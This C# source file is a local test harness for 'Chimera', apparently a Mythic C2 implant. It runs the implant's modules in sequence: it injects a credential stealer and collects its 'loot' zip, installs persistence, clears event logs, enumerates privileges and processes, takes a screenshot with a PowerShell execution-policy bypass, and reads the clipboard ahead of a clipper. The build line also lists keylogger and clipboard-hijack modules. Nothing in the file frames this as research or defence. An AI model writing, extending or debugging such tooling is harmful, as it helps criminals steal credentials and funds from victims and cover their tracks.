// Chimera Local Test Harness
// Runs every command locally with full console logging — no Mythic needed.
// Compile and run from PowerShell to verify all commands work before VM deployment.
//
// Build:
//   csc /target:exe /platform:x86 /out:chimera_local_test.exe `
//       /r:System.Net.Http.dll /r:System.Drawing.dll /r:System.Management.dll `
//       /r:System.ServiceProcess.dll /r:System.Windows.Forms.dll `
//       LocalTest.cs LocalConfig.cs `
//       ..\agent_code\Staging.cs ..\agent_code\Commands\Shell.cs `
//       ..\agent_code\Commands\Ls.cs ..\agent_code\Commands\Pwd.cs `
//       ..\agent_code\Commands\Ps.cs ..\agent_code\Commands\Screenshot.cs `
//       ..\agent_code\Commands\Persist.cs ..\agent_code\Commands\ClearLogs.cs `
//       ..\agent_code\Commands\InjectAssembly.cs ..\agent_code\Commands\Upload.cs `
//       ..\agent_code\Commands\Collect.cs ..\agent_code\Commands\Clipper.cs `
//       ..\agent_code\Commands\Keylogger.cs ..\agent_code\Commands\Help.cs `
//       ..\agent_code\StringHelper.cs

using System;
using System.IO;
using System.Diagnostics;
using System.Threading;

namespace Chimera
{
    class LocalTest
    {
        static string LOG_FILE = @"C:\projects\chimera-local-test\chimera_test.log";

        static void Main(string[] args)
        {
            // Ensure log dir exists
            Directory.CreateDirectory(@"C:\projects\chimera-local-test");

            // Tee output to both console and log file
            var logWriter = new StreamWriter(LOG_FILE, append: false) { AutoFlush = true };
            var tee = new TeeWriter(Console.Out, logWriter);
            Console.SetOut(tee);

            Log("=== Chimera Local Test Harness ===");
            Log("Time:     " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
            Log("User:     " + Environment.UserName);
            Log("Machine:  " + Environment.MachineName);
            Log("StageDir: " + Staging.Dir);
            Log("LootDir:  " + LocalConfig.LootDir);
            Log("");

            // ----------------------------------------------------------------
            // STEP 1: Ensure staging dir exists
            // ----------------------------------------------------------------
            Section("1. Create staging directory");
            Staging.EnsureDir();
            Log("[+] " + Staging.Dir + " ready");

            // ----------------------------------------------------------------
            // STEP 2: Check stealer.exe is present
            // ----------------------------------------------------------------
            Section("2. Check stealer.exe");
            string stealerExe = Path.Combine(Staging.Dir, "stealer.exe");
            if (File.Exists(stealerExe))
                Log("[+] stealer.exe found at " + stealerExe);
            else
                Log("[-] stealer.exe NOT found at " + stealerExe + " — run_stealer will fail");

            // ----------------------------------------------------------------
            // STEP 3: Run stealer
            // ----------------------------------------------------------------
            Section("3. Run stealer (run_stealer)");
            // Use a fake taskID/callbackUUID — Upload will fail (no Mythic) but stealer runs
            string result = Commands.InjectAssembly.Execute("run_stealer", "local-task-001", "local-uuid-0000");
            Log(result);

            // stealer.exe writes stealer_loot.zip to C:\Users\Public (Staging.Dir)
            // Copy it to chimera-local-test for easy inspection
            string stagingLoot = Path.Combine(Staging.Dir, "stealer_loot.zip");
            string lootZip     = Path.Combine(LocalConfig.LootDir, "stealer_loot.zip");
            if (File.Exists(stagingLoot))
            {
                File.Copy(stagingLoot, lootZip, overwrite: true);
                Log("[+] Loot zip: " + stagingLoot
                    + " (" + new FileInfo(stagingLoot).Length / 1024 + " KB)");
                Log("[+] Copied to: " + lootZip + " for inspection");
            }
            else
            {
                Log("[-] stealer_loot.zip not found at " + stagingLoot
                    + " — stealer may have failed (check log above)");
            }

            // ----------------------------------------------------------------
            // STEP 4: Persist
            // ----------------------------------------------------------------
            Section("4. Persistence (persist)");
            Log(Commands.Persist.Execute());

            // ----------------------------------------------------------------
            // STEP 5: ClearLogs  (needs admin — will report errors if not elevated)
            // ----------------------------------------------------------------
            Section("5. Clear logs (clearlogs)");
            Log(Commands.ClearLogs.Execute());

            // ----------------------------------------------------------------
            // STEP 6: Shell command
            // ----------------------------------------------------------------
            Section("6. Shell command (whoami /all)");
            Log(Commands.Shell.Execute("whoami /all"));

            // ----------------------------------------------------------------
            // STEP 7: Process list
            // ----------------------------------------------------------------
            Section("7. Process list (ps)");
            Log(Commands.Ps.Execute());

            // ----------------------------------------------------------------
            // STEP 8: Directory listing
            // ----------------------------------------------------------------
            Section("8. Directory listing (ls C:\\Users\\Public)");
            Log(Commands.Ls.Execute(@"C:\Users\Public"));

            // ----------------------------------------------------------------
            // STEP 9: Screenshot
            // ----------------------------------------------------------------
            Section("9. Screenshot");
            // Screenshot normally uploads — here we just capture to staging dir
            string screenshotPath = Path.Combine(LocalConfig.LootDir, "screenshot.png");
            try
            {
                // Use Shell to run a PowerShell screenshot since Screenshot.cs uploads
                string ps = "Add-Type -AssemblyName System.Windows.Forms;" +
                            "$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;" +
                            "$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height);" +
                            "$g=[System.Drawing.Graphics]::FromImage($b);" +
                            "$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);" +
                            "$b.Save('" + screenshotPath.Replace("'", "''") + "');" +
                            "$b.Dispose();$g.Dispose()";
                string ssResult = Commands.Shell.Execute("powershell -ep bypass -c \"" + ps + "\"");
                if (File.Exists(screenshotPath))
                    Log("[+] Screenshot saved: " + screenshotPath + " (" + new FileInfo(screenshotPath).Length / 1024 + " KB)");
                else
                    Log("[-] Screenshot failed: " + ssResult);
            }
            catch (Exception ex)
            {
                Log("[error] Screenshot: " + ex.Message);
            }

            // ----------------------------------------------------------------
            // STEP 10: Clipper test (read current clipboard)
            // ----------------------------------------------------------------
            Section("10. Clipboard read (before clipper)");
            try
            {
                string clip = Commands.Shell.Execute(
                    "powershell -c \"Get-Clipboard\"");
                Log("Current clipboard: " + (clip.Trim().Length > 0 ? clip.Trim() : "(empty)"));
            }
            catch { }

            // ----------------------------------------------------------------
            // DONE
            // ----------------------------------------------------------------
            Section("=== TEST COMPLETE ===");
            Log("Log file:  " + LOG_FILE);
            Log("Loot dir:  " + LocalConfig.LootDir);
            Log("");
            Log("Review the output above and paste to check for any [-] failures.");
            Log("Press Enter to exit...");

            logWriter.Close();
            Console.ReadLine();
        }

        static void Section(string title)
        {
            Log("");
            Log("─────────────────────────────────────────");
            Log("  " + title);
            Log("─────────────────────────────────────────");
        }

        static void Log(string msg)
        {
            Console.WriteLine(msg);
        }
    }

    // Tee: writes to two TextWriters simultaneously
    class TeeWriter : TextWriter
    {
        readonly TextWriter _a, _b;
        public TeeWriter(TextWriter a, TextWriter b) { _a = a; _b = b; }
        public override System.Text.Encoding Encoding => _a.Encoding;
        public override void WriteLine(string value)
        {
            _a.WriteLine(value);
            _b.WriteLine(value);
        }
        public override void Write(char value)
        {
            _a.Write(value);
            _b.Write(value);
        }
        public override void Flush() { _a.Flush(); _b.Flush(); }
    }
}
